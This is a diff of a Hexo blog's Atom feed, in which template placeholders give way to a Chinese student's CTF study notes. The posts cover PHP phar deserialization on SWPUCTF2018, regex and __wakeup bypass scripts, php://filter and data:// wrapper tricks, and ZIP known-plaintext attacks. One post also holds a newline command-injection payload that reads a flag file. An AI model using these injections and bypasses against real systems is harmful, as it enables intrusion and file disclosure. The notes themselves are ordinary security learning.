@@ -1,54 +1,34 @@
 <?xml version="1.0" encoding="utf-8"?>
 <feed xmlns="http://www.w3.org/2005/Atom">
-  <title>{{ config.title }}</title>
+  <title>wds&#39;s 学习博客</title>
   
   
-  <link href="{{ feed_url | uriencode }}" rel="self"/>
+  <link href="http://example.com/atom.xml" rel="self"/>
   
-  <link href="{{ url | uriencode }}"/>
-  <updated>{{ posts.first().updated.toISOString() }}</updated>
-  <id>{{ url | uriencode }}</id>
+  <link href="http://example.com/"/>
+  <updated>2021-09-17T17:39:10.000Z</updated>
+  <id>http://example.com/</id>
   
   <author>
-    <name>{{ config.author }}</name>
+    <name>wang deshan</name>
     
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
   
   <entry>
-    <title>{{ post.title }}</title>
-    <link href="{{ post.permalink | uriencode }}"/>
-    <id>{{ post.permalink | uriencode }}</id>
-    <published>{{ post.date.toISOString() }}</published>
-    <updated>{{ post.updated.toISOString() }}</updated>
+    <title>Hello World</title>
+    <link href="http://example.com/2023/11/25/hello-world/"/>
+    <id>http://example.com/2023/11/25/hello-world/</id>
+    <published>2023-11-25T06:25:33.920Z</published>
+    <updated>2021-09-17T17:39:10.000Z</updated>
     
-    <content type="html"><![CDATA[{{ post.content | noControlChars | safe }}]]></content>
-    
-    
-      
-      
-    <summary type="html">{{ short_content }}</summary>
-      
-    
-    
-    
-    
-  </entry>
-  
-  <entry>
-    <title>{{ post.title }}</title>
-    <link href="{{ post.permalink | uriencode }}"/>
-    <id>{{ post.permalink | uriencode }}</id>
-    <published>{{ post.date.toISOString() }}</published>
-    <updated>{{ post.updated.toISOString() }}</updated>
-    
-    <content type="html"><![CDATA[{{ post.content | noControlChars | safe }}]]></content>
+    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
     
     
       
       
-    <summary type="html">{{ short_content }}</summary>
+    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
       
     
     
@@ -57,38 +37,18 @@
   </entry>
   
   <entry>
-    <title>{{ post.title }}</title>
-    <link href="{{ post.permalink | uriencode }}"/>
-    <id>{{ post.permalink | uriencode }}</id>
-    <published>{{ post.date.toISOString() }}</published>
-    <updated>{{ post.updated.toISOString() }}</updated>
+    <title>20220427</title>
+    <link href="http://example.com/2022/04/27/20220427/"/>
+    <id>http://example.com/2022/04/27/20220427/</id>
+    <published>2022-04-27T13:04:04.000Z</published>
+    <updated>2022-04-27T13:17:14.000Z</updated>
     
-    <content type="html"><![CDATA[{{ post.content | noControlChars | safe }}]]></content>
-    
-    
-      
-      
-    <summary type="html">{{ short_content }}</summary>
-      
-    
-    
-    
-    
-  </entry>
-  
-  <entry>
-    <title>{{ post.title }}</title>
-    <link href="{{ post.permalink | uriencode }}"/>
-    <id>{{ post.permalink | uriencode }}</id>
-    <published>{{ post.date.toISOString() }}</published>
-    <updated>{{ post.updated.toISOString() }}</updated>
-    
-    <content type="html"><![CDATA[{{ post.content | noControlChars | safe }}]]></content>
+    <content type="html"><![CDATA[<h1 id="phar序列化"><a href="#phar序列化" class="headerlink" title="phar序列化"></a>phar序列化</h1><h2 id="swpuctf2018simplephp1"><a href="#swpuctf2018simplephp1" class="headerlink" title="swpuctf2018simplephp1"></a>swpuctf2018simplephp1</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#class</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str = <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;test = <span class="keyword">$this</span>-&gt;str;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = <span class="variable">$file</span>;   <span class="comment">//$this-&gt;source = phar://phar.jpg</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$content</span> = <span class="keyword">$this</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>]-&gt;source;<span class="comment">#str[&#x27;str&#x27;]有个成员source，则str[&#x27;str&#x27;]是一个类str[&#x27;str&#x27;]=new Test()</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$key</span>,<span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;<span class="variable">$key</span> = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/http|https|file:|gopher|dict|\.\.|f1ag/i&#x27;</span>,<span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            highlight_file(<span class="keyword">$this</span>-&gt;source);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/http|https|file:|gopher|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker~&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$params</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;params = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)#$<span class="title">key</span>=<span class="title">source</span>自动复制，因为<span class="title">show</span>的</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="variable">$key</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;params[<span class="variable">$key</span>])) &#123;</span><br><span class="line">            <span class="variable">$value</span> = <span class="keyword">$this</span>-&gt;params[<span class="variable">$key</span>];<span class="comment">#$value=&quot;/var/www/html/f1ag.php&quot;</span></span><br><span class="line">                                         <span class="comment">#$params[key]=&quot;/var/www/html/f1ag.php&quot;</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$value</span> = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;file_get(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$text</span> = base64_encode(file_get_contents(<span class="variable">$value</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$text</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>C1e4r</p><p>分析：__construct($name)是在C1e4r被创造时执行</p><p>__destruct()是在被销毁时执行</p><h3 id="Show"><a href="#Show" class="headerlink" title="Show"></a>Show</h3><p>分析：__toString()是在被当作字符串打印时执行，可以由C1e4r中的echo触发</p>]]></content>
     
     
       
       
-    <summary type="html">{{ short_content }}</summary>
+    <summary type="html">&lt;h1 id=&quot;phar序列化&quot;&gt;&lt;a href=&quot;#phar序列化&quot; class=&quot;headerlink&quot; title=&quot;phar序列化&quot;&gt;&lt;/a&gt;phar序列化&lt;/h1&gt;&lt;h2 id=&quot;swpuctf2018simplephp1&quot;&gt;&lt;a href=&quot;#swpuctf2018s</summary>
       
     
     
@@ -97,384 +57,430 @@
   </entry>
   
   <entry>
-    <title>{{ post.title }}</title>
-    <link href="{{ post.permalink | uriencode }}"/>
-    <id>{{ post.permalink | uriencode }}</id>
-    <published>{{ post.date.toISOString() }}</published>
-    <updated>{{ post.updated.toISOString() }}</updated>
+    <title>20220425</title>
+    <link href="http://example.com/2022/04/25/20220425/"/>
+    <id>http://example.com/2022/04/25/20220425/</id>
+    <published>2022-04-25T12:59:23.000Z</published>
+    <updated>2022-04-25T13:31:36.000Z</updated>
     
-    <content type="html"><![CDATA[{{ post.content | noControlChars | safe }}]]></content>
+    <content type="html"><![CDATA[<h1 id="favorite-num"><a href="#favorite-num" class="headerlink" title="favorite_num"></a>favorite_num</h1><h2 id="1-php数组下标的整形溢出"><a href="#1-php数组下标的整形溢出" class="headerlink" title="1.php数组下标的整形溢出"></a>1.php数组下标的整形溢出</h2><p>也就是说数组中下表为0的元素与下表为4294967296 //0x100000000 的元素表示同一个</p><h2 id="2-绕过对num的检查"><a href="#2-绕过对num的检查" class="headerlink" title="2.绕过对num的检查"></a>2.绕过对num的检查</h2><p>%0a（换行符来绕过）</p><p>%0als /</p><p>然后用tac读取得到flag</p><p>stuff%5B4294967296%5D=admin&amp;stuff%5B1%5D=user&amp;num=123%0atac <code>find / -inum 37487226</code></p>]]></content>
     
     
       
       
-    <summary type="html">{{ short_content }}</summary>
+    <summary type="html">&lt;h1 id=&quot;favorite-num&quot;&gt;&lt;a href=&quot;#favorite-num&quot; class=&quot;headerlink&quot; title=&quot;favorite_num&quot;&gt;&lt;/a&gt;favorite_num&lt;/h1&gt;&lt;h2 id=&quot;1-php数组下标的整形溢出&quot;&gt;&lt;a href=&quot;</summary>
       
     
     
     
-    
-    <category term="{{ tag.name }}" scheme="{{ tag.permalink }}"/>
     
   </entry>
   
   <entry>
-    <title>{{ post.title }}</title>
-    <link href="{{ post.permalink | uriencode }}"/>
-    <id>{{ post.permalink | uriencode }}</id>
-    <published>{{ post.date.toISOString() }}</published>
-    <updated>{{ post.updated.toISOString() }}</updated>
+    <title>2022.04.22</title>
+    <link href="http://example.com/2022/04/22/2022-04-22/"/>
+    <id>http://example.com/2022/04/22/2022-04-22/</id>
+    <published>2022-04-22T11:24:06.000Z</published>
+    <updated>2022-04-22T11:25:26.000Z</updated>
     
-    <content type="html"><![CDATA[{{ post.content | noControlChars | safe }}]]></content>
+    <content type="html"><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1>]]></content>
     
     
       
       
-    <summary type="html">{{ short_content }}</summary>
+    <summary type="html">&lt;h1 id=&quot;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title=&quot;&quot;&gt;&lt;/a&gt;&lt;/h1&gt;</summary>
       
     
     
     
-    <category term="{{ category.name }}" scheme="{{ category.permalink }}"/>
-    
-    
-    <category term="{{ tag.name }}" scheme="{{ tag.permalink }}"/>
     
   </entry>
   
   <entry>
-    <title>{{ post.title }}</title>
-    <link href="{{ post.permalink | uriencode }}"/>
-    <id>{{ post.permalink | uriencode }}</id>
-    <published>{{ post.date.toISOString() }}</published>
-    <updated>{{ post.updated.toISOString() }}</updated>
+    <title>20220418</title>
+    <link href="http://example.com/2022/04/18/20220418/"/>
+    <id>http://example.com/2022/04/18/20220418/</id>
+    <published>2022-04-18T05:12:08.000Z</published>
+    <updated>2022-04-26T11:51:14.000Z</updated>
     
-    <content type="html"><![CDATA[{{ post.content | noControlChars | safe }}]]></content>
+    <content type="html"><![CDATA[<h1 id="宽松比较（-）类型转化规则"><a href="#宽松比较（-）类型转化规则" class="headerlink" title="宽松比较（==）类型转化规则"></a>宽松比较（==）类型转化规则</h1><p>（1）数字和字符串比较，将字符串转化为数字，然后进行比较</p><p>若字符串的开头不为数字则转化成0，如有数字则转化成该数字</p><p>（2）数字和布尔型比较，将数字转为布尔型，然后进行比较</p><p>（3）字符串和布尔型的比较，将字符串转化为布尔型，然后进行比较</p><p>总结：宽松比较的落脚点只有两个，一个是布尔型，一个是数字型。只有当数字和字符串比较的时候，会将字符串转为数字型</p><h1 id="str-replace-find-replace-string-count"><a href="#str-replace-find-replace-string-count" class="headerlink" title="str_replace(find,replace,string,count)"></a>str_replace(find,replace,string,count)</h1><p>find,必需，要查找的值</p><p>replace，必需要覆盖掉的值</p><p>sting，必需，被搜索的字符串</p><p>count，可舍，替换次数</p><p>可以利用大小写绕过</p><p>1.php伪协议</p><p>用法</p><p>php://input.用于执行php代码，需要post请求提交数据。</p><p>php://filter,用于读取源代码，get提交参数。</p><p>a=php://filter/read=convert.base64/resource=xxx.php</p><p>2.data伪协议</p><p>用法data://text/p;ain,xxxx(要执行的php代码)</p><p>data://text/plain;base64,xxxx(base64编码后的数据)</p><p>3.file伪协议</p><p>用法：</p><p>file://[本地文件系统的绝对路径]</p><h1 id="正则匹配：preg-match-‘-oc-d-i’-var"><a href="#正则匹配：preg-match-‘-oc-d-i’-var" class="headerlink" title="正则匹配：preg_match(‘/[oc]:\d+:/i’,$var)"></a>正则匹配：preg_match(‘/[oc]:\d+:/i’,$var)</h1><p>‘[oc]’ 匹配o或者c</p><p>‘\d’ 匹配任意一个十进制数</p><p>‘+’匹配前面字符的1-N次数<br>‘i’ 表示不区分大小写</p><p>绕过方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$var</span>=<span class="string">&#x27;O:+4:&quot;Demo&quot;:2:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$var</span>)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;stop hacking!&#x27;</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;success&#x27;</span>;  </span><br><span class="line">    &#125; </span><br><span class="line"><span class="comment">#由于我们把O:4改为了O:+4，那么就匹配不完全，则成功绕过正则匹配</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = <span class="variable">$file</span>; </span><br><span class="line">    &#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$chen</span> = <span class="keyword">new</span> Demo(<span class="string">&#x27;fl4g.php&#x27;</span>);</span><br><span class="line"><span class="variable">$chen</span> = serialize(<span class="variable">$chen</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$chen</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$chen</span> =str_replace(<span class="string">&#x27;O:4&#x27;</span>,<span class="string">&#x27;O:+4&#x27;</span>,<span class="variable">$chen</span>);   <span class="comment">#用+4替换4是为了绕过preg_match()的正则匹配</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$chen</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$chen</span>=str_replace(<span class="string">&#x27;:1:&#x27;</span>,<span class="string">&#x27;:2:&#x27;</span>,<span class="variable">$chen</span>);     <span class="comment">#绕过__wakeup()魔术方法</span></span><br><span class="line"><span class="variable">$chen</span>=base64_encode(<span class="variable">$chen</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$chen</span>.<span class="string">&quot;&lt;br\&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/21/W5AEkn3YVvBlhwK.png" alt="QQ图片20220421201238.png"></p><h1 id="alter-可以弹出function的函数"><a href="#alter-可以弹出function的函数" class="headerlink" title="alter(_)可以弹出function的函数"></a>alter(_)可以弹出function的函数</h1><h2 id="如果成员的属性为private，所以要在类名和成员名之前加上-00这个url编码是空的意识。因为序列化时不会把空输出。"><a href="#如果成员的属性为private，所以要在类名和成员名之前加上-00这个url编码是空的意识。因为序列化时不会把空输出。" class="headerlink" title="如果成员的属性为private，所以要在类名和成员名之前加上%00这个url编码是空的意识。因为序列化时不会把空输出。"></a>如果成员的属性为private，所以要在类名和成员名之前加上%00这个url编码是空的意识。因为序列化时不会把空输出。</h2><p>例题：BUUCTF极客大挑战2019php1</p>]]></content>
     
     
       
       
-    <summary type="html">{{ short_content }}</summary>
+    <summary type="html">&lt;h1 id=&quot;宽松比较（-）类型转化规则&quot;&gt;&lt;a href=&quot;#宽松比较（-）类型转化规则&quot; class=&quot;headerlink&quot; title=&quot;宽松比较（==）类型转化规则&quot;&gt;&lt;/a&gt;宽松比较（==）类型转化规则&lt;/h1&gt;&lt;p&gt;（1）数字和字符串比较，将字符串转化为数字，然后</summary>
       
     
     
     
-    <category term="{{ category.name }}" scheme="{{ category.permalink }}"/>
     
-    
-    <category term="{{ tag.name }}" scheme="{{ tag.permalink }}"/>
+    <category term="php" scheme="http://example.com/tags/php/"/>
     
   </entry>
   
   <entry>
-    <title>{{ post.title }}</title>
-    <link href="{{ post.permalink | uriencode }}"/>
-    <id>{{ post.permalink | uriencode }}</id>
-    <published>{{ post.date.toISOString() }}</published>
-    <updated>{{ post.updated.toISOString() }}</updated>
+    <title>明文攻击</title>
+    <link href="http://example.com/2022/03/08/%E6%98%8E%E6%96%87%E6%94%BB%E5%87%BB/"/>
+    <id>http://example.com/2022/03/08/%E6%98%8E%E6%96%87%E6%94%BB%E5%87%BB/</id>
+    <published>2022-03-08T10:26:01.000Z</published>
+    <updated>2022-03-08T11:11:18.000Z</updated>
     
-    <content type="html"><![CDATA[{{ post.content | noControlChars | safe }}]]></content>
+    <content type="html"><![CDATA[<p>因为在misc审核考试中遇到了这一类题目，由于出题人说有手就行，于是我恶补了这一块内容</p><h1 id="关于明文攻击一些不得不说的内容"><a href="#关于明文攻击一些不得不说的内容" class="headerlink" title="关于明文攻击一些不得不说的内容"></a>关于明文攻击一些不得不说的内容</h1><h2 id="明文攻击的条件："><a href="#明文攻击的条件：" class="headerlink" title="明文攻击的条件："></a>明文攻击的条件：</h2><p>一个压缩包，和拥有一个已知的存在压缩中出现的文件。</p><h2 id="明文攻击的原理："><a href="#明文攻击的原理：" class="headerlink" title="明文攻击的原理："></a>明文攻击的原理：</h2><p>将已知文件进行ZIP加密后和待解密的ZIP里已知文件进行hex对比，两者的区别就是ZIP加密的三个key(压缩包中的每个文件都是通过这三个Key进行加密压缩的)，由此得到加密文件的三个key。（一个非常抽象的概念，就是由结果来推理过程吧）</p><p>你输入的密码，首先被转换成3个32bit的key，所以可能的key的组合是2^96，这是个天文数字，如果用暴力穷举的方式是不太可能的，除非你的密码比较短或者有个厉害的字典。压缩软件用这3个key加密所有包中的文件，这也就是说，所有文件的key是一样的，如果我们能够找到这个key，就能解开所有的文件。如果我们找到加密压缩包中的任意一个文件，这个文件和压缩包里的文件是一样的，我们把这个文件用同样的压缩软件同样的压缩方式进行无密码的压缩，得到的文件就是我们的Known  plaintext。用这个无密码的压缩包和有密码的压缩包进行比较，分析两个包中相同的那个文件，抽取出两个文件的不同点，就是那3个key了，如此就能得到key。两个相同文件在压缩包中的字节数应该相差12个byte，就是那3个key了。虽然我们还是无法通过这个key还原出密码，但是我们已经可以用这个key解开所有的文件，所以已经满足我的要求了，而且要以前的密码也没什么用呀，我只要文件。</p><h2 id="明文攻击的工具："><a href="#明文攻击的工具：" class="headerlink" title="明文攻击的工具："></a>明文攻击的工具：</h2><p>AZPR</p><h2 id="例："><a href="#例：" class="headerlink" title="例："></a>例：</h2><p>1.zip</p><p><img src="https://s2.loli.net/2022/03/08/ygYIGuEBMwbHUpv.png" alt="QQ截图20220308190551.png"></p><p>查看文件，我们要解压的1.zip中也存在《青玉案元夕》于是我们用相同的方式进行压缩</p><p>然后进行明文攻击。</p>]]></content>
     
     
       
       
-    <summary type="html">{{ short_content }}</summary>
+    <summary type="html">&lt;p&gt;因为在misc审核考试中遇到了这一类题目，由于出题人说有手就行，于是我恶补了这一块内容&lt;/p&gt;
+&lt;h1 id=&quot;关于明文攻击一些不得不说的内容&quot;&gt;&lt;a href=&quot;#关于明文攻击一些不得不说的内容&quot; class=&quot;headerlink&quot; title=&quot;关于明文攻击一些不得不</summary>
       
     
     
     
-    <category term="{{ category.name }}" scheme="{{ category.permalink }}"/>
+    <category term="misc" scheme="http://example.com/categories/misc/"/>
     
     
-    <category term="{{ tag.name }}" scheme="{{ tag.permalink }}"/>
+    <category term="兼职miscer" scheme="http://example.com/tags/%E5%85%BC%E8%81%8Cmiscer/"/>
     
   </entry>
   
   <entry>
-    <title>{{ post.title }}</title>
-    <link href="{{ post.permalink | uriencode }}"/>
-    <id>{{ post.permalink | uriencode }}</id>
-    <published>{{ post.date.toISOString() }}</published>
-    <updated>{{ post.updated.toISOString() }}</updated>
+    <title>python之zipfile库</title>
+    <link href="http://example.com/2022/03/02/python%E4%B9%8Bzipfile%E5%BA%93/"/>
+    <id>http://example.com/2022/03/02/python%E4%B9%8Bzipfile%E5%BA%93/</id>
+    <published>2022-03-02T01:59:38.000Z</published>
+    <updated>2022-03-03T02:31:28.000Z</updated>
     
-    <content type="html"><![CDATA[{{ post.content | noControlChars | safe }}]]></content>
